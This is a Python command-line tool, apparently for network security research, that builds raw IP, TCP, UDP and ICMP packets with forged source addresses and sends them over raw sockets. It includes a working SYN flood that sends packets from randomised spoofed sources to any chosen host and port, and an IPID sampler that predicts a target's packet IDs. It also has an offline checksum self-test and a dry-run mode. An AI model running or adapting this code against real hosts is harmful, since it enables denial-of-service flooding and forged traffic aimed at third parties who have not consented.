#!/usr/bin/env python3
"""
N6 - IP Spoofing Tool
Craft packets with spoofed source IP addresses, SYN flood simulation,
and IPID prediction for network security research.
"""

import socket
import struct
import os
import sys
import time
import random
import argparse
from collections import defaultdict


class IPSpoofer:
    """IP packet crafting and spoofing engine."""

    def __init__(self):
        self.sent_packets = 0
        self.ipid_sequence = []
        self.target_ipids = defaultdict(list)

    @staticmethod
    def checksum(data):
        """Calculate IP/TCP checksum."""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    @staticmethod
    def ip_to_int(ip_str):
        """Convert dotted-quad IP string to integer."""
        parts = ip_str.split('.')
        return (int(parts[0]) << 24) + (int(parts[1]) << 16) + \
               (int(parts[2]) << 8) + int(parts[3])

    @staticmethod
    def int_to_ip(ip_int):
        """Convert integer to dotted-quad IP string."""
        return f"{(ip_int >> 24) & 0xff}.{(ip_int >> 16) & 0xff}." \
               f"{(ip_int >> 8) & 0xff}.{ip_int & 0xff}"

    def build_ip_header(self, src_ip, dst_ip, protocol, payload_len):
        """Build raw IP header with spoofed source."""
        version = 4
        ihl = 5
        tos = 0
        total_len = 20 + payload_len
        ident = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        proto = protocol
        check = 0
        src = socket.inet_aton(src_ip)
        dst = socket.inet_aton(dst_ip)

        header = struct.pack('!BBHHHBBH4s4s',
                             (version << 4) | ihl, tos, total_len,
                             ident, frag_off, ttl, proto, check, src, dst)
        c = self.checksum(header)
        header = struct.pack('!BBHHHBBH4s4s',
                             (version << 4) | ihl, tos, total_len,
                             ident, frag_off, ttl, proto, c, src, dst)
        return header

    def _pseudo_header(self, src_ip, dst_ip, protocol, length):
        """IPv4 transport pseudo-header for TCP/UDP checksums."""
        return (socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
                + struct.pack('!BBH', 0, protocol, length))

    def transport_checksum(self, src_ip, dst_ip, protocol, header, payload=b''):
        """16-bit TCP/UDP checksum incl. the pseudo-header.

        `header` must have its checksum field set to zero.
        """
        length = len(header) + len(payload)
        return self.checksum(self._pseudo_header(src_ip, dst_ip, protocol,
                                                 length) + header + payload)

    def build_tcp_header(self, src_port, dst_port, flags, seq_num, ack_num):
        """Build raw TCP header."""
        data_offset = 5
        reserved = 0
        window = socket.htons(5840)
        urg_ptr = 0

        flag_map = {
            'SYN': 0x02, 'ACK': 0x10, 'FIN': 0x01,
            'RST': 0x04, 'PSH': 0x08, 'URG': 0x20
        }
        tcp_flags = 0
        for f in flags:
            tcp_flags |= flag_map.get(f, 0)

        header = struct.pack('!HHIIBBHHH',
                             src_port, dst_port, seq_num, ack_num,
                             (data_offset << 4) | reserved, tcp_flags,
                             window, 0, urg_ptr)
        return header

    def build_udp_header(self, src_port, dst_port, payload_len):
        """Build raw UDP header."""
        length = 8 + payload_len
        return struct.pack('!HHHH', src_port, dst_port, length, 0)

    def craft_raw_packet(self, src_ip, dst_ip, src_port, dst_port,
                         protocol='TCP', flags=None, payload=b'',
                         seq_num=0, ack_num=0):
        """Craft a complete IP packet with spoofed source address."""
        if flags is None:
            flags = ['SYN']

        if protocol.upper() == 'TCP':
            tcp_hdr = bytearray(self.build_tcp_header(src_port, dst_port,
                                                      flags, seq_num, ack_num))
            ck = self.transport_checksum(src_ip, dst_ip, 6,
                                         bytes(tcp_hdr), payload)
            tcp_hdr[16:18] = struct.pack('!H', ck)
            tcp_hdr = bytes(tcp_hdr)
            ip_hdr = self.build_ip_header(src_ip, dst_ip, 6,
                                           len(tcp_hdr) + len(payload))
            return ip_hdr + tcp_hdr + payload

        elif protocol.upper() == 'UDP':
            udp_hdr = bytearray(self.build_udp_header(src_port, dst_port,
                                                      len(payload)))
            ck = self.transport_checksum(src_ip, dst_ip, 17,
                                         bytes(udp_hdr), payload)
            udp_hdr[6:8] = struct.pack('!H', ck)
            udp_hdr = bytes(udp_hdr)
            ip_hdr = self.build_ip_header(src_ip, dst_ip, 17,
                                           len(udp_hdr) + len(payload))
            return ip_hdr + udp_hdr + payload

        elif protocol.upper() == 'ICMP':
            icmp_type = 8
            icmp_code = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = 0
            icmp_hdr = struct.pack('!BBHHH', icmp_type, icmp_code, 0,
                                   icmp_id, icmp_seq)
            c = self.checksum(icmp_hdr + payload)
            icmp_hdr = struct.pack('!BBHHH', icmp_type, icmp_code, c,
                                   icmp_id, icmp_seq)
            ip_hdr = self.build_ip_header(src_ip, dst_ip, 1,
                                           len(icmp_hdr) + len(payload))
            return ip_hdr + icmp_hdr + payload

        return None

    def send_spoofed(self, src_ip, dst_ip, dst_port=80, protocol='TCP',
                     flags=None, count=1, delay=0.1, iface=None):
        """Send spoofed packets using raw socket (--live)."""
        if flags is None:
            flags = ['SYN']

        print(f"[+] Spoofed {protocol} packets: {src_ip} -> {dst_ip}:{dst_port}")
        print(f"    Count: {count}, Flags: {flags}")

        sock = None
        try:
            if protocol.upper() == 'TCP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                     socket.IPPROTO_TCP)
            elif protocol.upper() == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                     socket.IPPROTO_UDP)
            elif protocol.upper() == 'ICMP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                     socket.IPPROTO_ICMP)
            else:
                print(f"[-] Unknown protocol: {protocol}")
                return

            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            if iface:
                # Pin the socket to a specific interface device.
                sock.setsockopt(socket.SOL_SOCKET, 25,  # SO_BINDTODEVICE
                                iface.encode() + b'\x00')
                print(f"    Bound to interface: {iface}")

            for i in range(count):
                src_port = random.randint(1024, 65535)
                packet = self.craft_raw_packet(src_ip, dst_ip, src_port,
                                               dst_port, protocol, flags)
                if packet:
                    sock.sendto(packet, (dst_ip, 0))
                    self.sent_packets += 1
                    if count <= 10 or (i + 1) % max(1, count // 10) == 0:
                        print(f"    [{i + 1}/{count}] Sent from port {src_port}")
                if delay > 0:
                    time.sleep(delay)

        except PermissionError:
            print("[-] Raw sockets require root privileges (sudo)")
        except OSError as e:
            print(f"[-] Socket error: {e}")
        finally:
            if sock:
                sock.close()

    def syn_flood_simulation(self, dst_ip, dst_port=80, count=100,
                             delay=0.05):
        """Simulate SYN flood for testing SYN cookies / SYN defenses."""
        print(f"[+] SYN Flood simulation: -> {dst_ip}:{dst_port}")
        print(f"    Packets: {count}, Delay: {delay}s")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("[-] Raw sockets require root privileges (sudo)")
            return

        src_ips = []
        for _ in range(min(count, 20)):
            octets = [random.randint(1, 254) for _ in range(4)]
            octets[0] = random.choice(range(1, 224))
            src_ips.append('.'.join(str(o) for o in octets))

        try:
            for i in range(count):
                src_ip = random.choice(src_ips)
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 0xFFFFFFFF)

                tcp_hdr = self.build_tcp_header(src_port, dst_port,
                                                ['SYN'], seq, 0)
                ip_hdr = self.build_ip_header(src_ip, dst_ip, 6,
                                               len(tcp_hdr))
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (dst_ip, 0))
                self.sent_packets += 1

                if count <= 20 or (i + 1) % max(1, count // 10) == 0:
                    print(f"    [{i + 1}/{count}] SYN from {src_ip}:{src_port}")
                if delay > 0:
                    time.sleep(delay)

        except KeyboardInterrupt:
            print("\n[!] Interrupted")
        finally:
            sock.close()
            print(f"[*] Total SYN packets sent: {self.sent_packets}")

    def predict_ipid(self, target_ip, samples=20, interval=0.5):
        """Analyze IPID sequence to predict next ID values."""
        print(f"[+] IPID prediction for {target_ip}")
        print(f"    Collecting {samples} samples...")

        ipids = []
        try:
            for i in range(samples):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                         socket.IPPROTO_ICMP)
                    sock.settimeout(2)
                    icmp_data = struct.pack('!BBHHH', 8, 0, 0,
                                            random.randint(1, 65535), i)
                    c = self.checksum(icmp_data)
                    icmp_data = struct.pack('!BBHHH', 8, 0, c,
                                            random.randint(1, 65535), i)
                    sock.sendto(icmp_data, (target_ip, 0))

                    data, _ = sock.recvfrom(1024)
                    ip_header = data[:20]
                    fields = struct.unpack('!BBHHHBBH4s4s', ip_header)
                    ipid = fields[3]
                    ipids.append(ipid)
                    sock.close()
                    if (i + 1) % 5 == 0:
                        print(f"    Sample {i + 1}/{samples}: IPID={ipid}")
                    time.sleep(interval)
                except (socket.timeout, OSError):
                    sock.close()
                    continue

        except PermissionError:
            print("[-] Raw sockets require root privileges")
            return

        if len(ipids) < 3:
            print("[-] Not enough samples collected")
            return

        self.target_ipids[target_ip] = ipids
        return self._analyze_ipid_sequence(target_ip, ipids)

    def _analyze_ipid_sequence(self, target_ip, ipids):
        """Analyze IPID sequence for predictability."""
        diffs = [ipids[i + 1] - ipids[i] for i in range(len(ipids) - 1)]
        mod_diffs = [d % 65536 for d in diffs]

        avg_diff = sum(mod_diffs) / len(mod_diffs) if mod_diffs else 0
        variance = sum((d - avg_diff) ** 2 for d in mod_diffs) / \
                   len(mod_diffs) if mod_diffs else 0
        std_dev = variance ** 0.5

        if std_dev < 50:
            predictability = "HIGH"
        elif std_dev < 500:
            predictability = "MEDIUM"
        else:
            predictability = "LOW"

        print(f"\n    === IPID Analysis for {target_ip} ===")
        print(f"    Samples:      {len(ipids)}")
        print(f"    IPID range:   {min(ipids)} - {max(ipids)}")
        print(f"    Avg step:     {avg_diff:.2f}")
        print(f"    Std dev:      {std_dev:.2f}")
        print(f"    Predictability: {predictability}")

        if predictability in ("HIGH", "MEDIUM"):
            predicted_next = (ipids[-1] + int(avg_diff)) % 65536
            print(f"    Predicted next IPID: {predicted_next}")

        return {
            'ipids': ipids, 'avg_step': avg_diff,
            'std_dev': std_dev, 'predictability': predictability
        }

    def generate_random_ip(self, class_type=None):
        """Generate random IP address with optional class constraints."""
        if class_type == 'A':
            return f"{random.randint(1, 126)}.{random.randint(0, 255)}." \
                   f"{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif class_type == 'B':
            return f"{random.randint(128, 191)}.{random.randint(0, 255)}." \
                   f"{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif class_type == 'C':
            return f"{random.randint(192, 223)}.{random.randint(0, 255)}." \
                   f"{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:
            return f"{random.randint(1, 254)}.{random.randint(0, 254)}." \
                   f"{random.randint(0, 254)}.{random.randint(1, 254)}"

    def print_stats(self):
        """Print session statistics."""
        print(f"\n=== Session Statistics ===")
        print(f"Packets sent:     {self.sent_packets}")
        print(f"Tracked targets:  {len(self.target_ipids)}")
        for ip, ipids in self.target_ipids.items():
            print(f"  {ip}: {len(ipids)} IPIDs collected")


def interactive_mode():
    """Interactive menu for IP spoofing tools."""
    spoofer = IPSpoofer()

    banner = """
    ╔═══════════════════════════════════════╗
    ║     N6 — IP Spoofing Tool            ║
    ║  Craft packets with spoofed IPs      ║
    ╚═══════════════════════════════════════╝
    """
    print(banner)

    while True:
        print("\n--- Menu ---")
        print("1. Send spoofed packet")
        print("2. SYN flood simulation")
        print("3. IPID prediction")
        print("4. Generate random IP")
        print("5. Craft raw packet (inspect)")
        print("6. Stats")
        print("0. Exit")

        choice = input("\n> ").strip()

        if choice == '1':
            src = input("Source IP (spoofed): ").strip()
            dst = input("Destination IP: ").strip()
            dport = int(input("Dest port [80]: ").strip() or '80')
            proto = input("Protocol (TCP/UDP/ICMP) [TCP]: ").strip() or 'TCP'
            count = int(input("Count [1]: ").strip() or '1')
            spoofer.send_spoofed(src, dst, dport, proto, count=count)

        elif choice == '2':
            dst = input("Target IP: ").strip()
            dport = int(input("Target port [80]: ").strip() or '80')
            count = int(input("Packet count [50]: ").strip() or '50')
            spoofer.syn_flood_simulation(dst, dport, count)

        elif choice == '3':
            target = input("Target IP: ").strip()
            samples = int(input("Samples [20]: ").strip() or '20')
            spoofer.predict_ipid(target, samples)

        elif choice == '4':
            cls = input("Class (A/B/C/any) [any]: ").strip().upper() or None
            print(f"  Generated: {spoofer.generate_random_ip(cls)}")

        elif choice == '5':
            src = input("Source IP: ").strip()
            dst = input("Dest IP: ").strip()
            proto = input("Protocol (TCP/UDP/ICMP) [TCP]: ").strip() or 'TCP'
            packet = spoofer.craft_raw_packet(src, dst, 12345, 80, proto)
            if packet:
                print(f"  Packet ({len(packet)} bytes):")
                print(f"  Hex: {packet.hex()}")
                print(f"  First 40 bytes: {packet[:40].hex(' ')}")

        elif choice == '6':
            spoofer.print_stats()

        elif choice == '0':
            break


def run_harness():
    """Offline checksum verification against known vectors.

    The IP vector is the classic IPv4 header example from networking texts;
    the TCP/UDP vectors are computed from the documented pseudo-header
    algorithm. All run with no privileges and no sockets.
    """
    import struct
    spoofer = IPSpoofer()
    ok = True

    def verify(label, cond, detail=''):
        nonlocal ok
        print(f'  [{"PASS" if cond else "FAIL"}] {label} {detail}')
        ok = ok and cond

    print('=== N6 IP Spoof: offline checksum verification ===')

    # 1. Classic IPv4 header checksum vector -> 0xB861
    ip_hdr = bytes.fromhex(
        '450000730000400040110000c0a80001c0a800c7')
    ip_ck = spoofer.checksum(ip_hdr)
    verify('IP header checksum == 0xB861', ip_ck == 0xB861,
           f'{ip_ck:04x}')

    # 2. TCP checksum via pseudo-header (fixed SYN segment) -> 0x0FED
    tcp = bytes.fromhex(
        '04d2' '0050' '00000000' '00000000' '5002' '16d0' '0000' '0000')
    tcp_ck = spoofer.transport_checksum('192.0.2.1', '192.0.2.2', 6, tcp)
    verify('TCP checksum (no payload) == 0x0FED',
           tcp_ck == 0x0FED, f'{tcp_ck:04x}')

    # 3. TCP checksum with payload -> 0xAF50  (flags byte 0x02 = SYN)
    tcp2 = bytes.fromhex(
        'c000' '01bb' '00000001' '00000000' '5002' '2000' '0000' '0000')
    tcp2_ck = spoofer.transport_checksum('198.51.100.1', '198.51.100.2', 6,
                                         tcp2, b'GET /')
    verify('TCP checksum (with payload) == 0xAF50',
           tcp2_ck == 0xAF50, f'{tcp2_ck:04x}')

    # 4. UDP checksum via pseudo-header -> 0x638A
    udp = bytes.fromhex('0035' '3039' '000c' '0000')
    udp_ck = spoofer.transport_checksum('192.0.2.1', '192.0.2.2', 17,
                                        udp, b'test')
    verify('UDP checksum == 0x638A', udp_ck == 0x638A, f'{udp_ck:04x}')

    # 5. Full crafted TCP packet: parse back and re-derive checksums
    pkt = spoofer.craft_raw_packet('192.0.2.1', '192.0.2.2', 49152, 443,
                                   protocol='TCP', flags=['SYN', 'ACK'],
                                   payload=b'GET /')
    ip_fields = struct.unpack('!BBHHHBBH4s4s', pkt[:20])
    stored_ip_ck = ip_fields[7]
    zeroed = pkt[:10] + b'\x00\x00' + pkt[12:20]
    verify('crafted IP header checksum valid',
           spoofer.checksum(zeroed) == stored_ip_ck,
           f'{stored_ip_ck:04x}')
    tcp_from_pkt = pkt[20:40]
    stored_tcp_ck = struct.unpack('!H', tcp_from_pkt[16:18])[0]
    zeroed_tcp = tcp_from_pkt[:16] + b'\x00\x00' + tcp_from_pkt[18:]
    verify('crafted TCP checksum valid (pseudo-header + payload)',
           spoofer.transport_checksum('192.0.2.1', '192.0.2.2', 6,
                                      zeroed_tcp, b'GET /') == stored_tcp_ck,
           f'{stored_tcp_ck:04x}')
    verify('crafted IP total length correct',
           ip_fields[2] == len(pkt), f'{ip_fields[2]} vs {len(pkt)}')

    # 6. Crafted UDP packet
    upkt = spoofer.craft_raw_packet('192.0.2.1', '192.0.2.2', 53, 12345,
                                    protocol='UDP', payload=b'test')
    udp_from = upkt[20:28]
    stored_udp_ck = struct.unpack('!H', udp_from[6:8])[0]
    zeroed_udp = udp_from[:6] + b'\x00\x00'
    verify('crafted UDP checksum valid',
           spoofer.transport_checksum('192.0.2.1', '192.0.2.2', 17,
                                      zeroed_udp, b'test') == stored_udp_ck,
           f'{stored_udp_ck:04x}')

    print('\n[RESULT] ' + ('PASS' if ok else 'FAIL'))
    return 0 if ok else 1


def main():
    parser = argparse.ArgumentParser(
        description='N6 — IP Spoofing Tool (offline checksum engine + '
                    '--live raw send)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                  # offline checksum harness (default)
  %(prog)s --harness        # same
  %(prog)s --show --src 192.0.2.1 --dst 192.0.2.2   # print packet bytes
  %(prog)s --live --src 192.0.2.1 --dst 192.0.2.2 --iface eth0  # send
  %(prog)s -i               # interactive
        """)
    parser.add_argument('--interactive', '-i', action='store_true',
                        help='Interactive mode')
    parser.add_argument('--harness', action='store_true',
                        help='Run offline checksum harness (default)')
    parser.add_argument('--show', '--dry-run', action='store_true',
                        dest='show',
                        help='Build and print the packet without sending')
    parser.add_argument('--live', action='store_true',
                        help='Actually send on a raw socket (root)')
    parser.add_argument('--iface', help='Interface for SO_BINDTODEVICE')
    parser.add_argument('--src', help='Source IP (spoofed)')
    parser.add_argument('--dst', help='Destination IP')
    parser.add_argument('--dport', type=int, default=80,
                        help='Destination port (default: 80)')
    parser.add_argument('--protocol', default='TCP',
                        choices=['TCP', 'UDP', 'ICMP'],
                        help='Protocol (default: TCP)')
    parser.add_argument('--count', type=int, default=1,
                        help='Number of packets')
    parser.add_argument('--syn-flood', action='store_true',
                        help='SYN flood simulation mode (--live)')
    parser.add_argument('--ipid-predict', action='store_true',
                        help='IPID prediction mode (--live)')
    parser.add_argument('--target', help='Target for IPID prediction')
    parser.add_argument('--ipid-samples', type=int, default=20,
                        help='IPID prediction samples')
    parser.add_argument('--random-ip', action='store_true',
                        help='Generate a random IP')

    args = parser.parse_args()
    spoofer = IPSpoofer()

    if args.harness or not any([args.src, args.dst, args.syn_flood,
                                args.ipid_predict, args.random_ip,
                                args.interactive]):
        sys.exit(run_harness())

    if args.interactive:
        interactive_mode()
        return 0

    if args.random_ip:
        print(f"Random IP: {spoofer.generate_random_ip()}")
        return 0

    if args.ipid_predict:
        if not args.target:
            print("[-] --target required for IPID prediction")
            return 1
        if not args.live:
            print("[-] IPID prediction needs a raw socket; rerun with --live "
                  "(root). Use --harness for offline work.")
            return 1
        spoofer.predict_ipid(args.target, args.ipid_samples)
        return 0

    if args.syn_flood:
        if not args.dst:
            print("[-] --dst required for SYN flood")
            return 1
        if not args.live:
            print("[-] SYN flood sends raw packets; rerun with --live (root).")
            return 1
        spoofer.syn_flood_simulation(args.dst, args.dport, args.count)
        return 0

    if args.src and args.dst:
        if args.show:
            packet = spoofer.craft_raw_packet(
                args.src, args.dst, 12345, args.dport, args.protocol)
            print(f"[+] Packet ({len(packet)} bytes), not sent (--dry-run):")
            print(f"    Hex: {packet.hex()}")
            print(f"    First 40 bytes: {packet[:40].hex(' ')}")
            return 0
        if not args.live:
            print("[-] Sending requires a raw socket; rerun with --live "
                  "(root), or use --show to inspect the crafted bytes.")
            return 1
        spoofer.send_spoofed(args.src, args.dst, args.dport, args.protocol,
                             count=args.count, iface=args.iface)
        return 0

    print("[-] --src and --dst required, or use --interactive")
    return 1


if __name__ == '__main__':
    sys.exit(main())
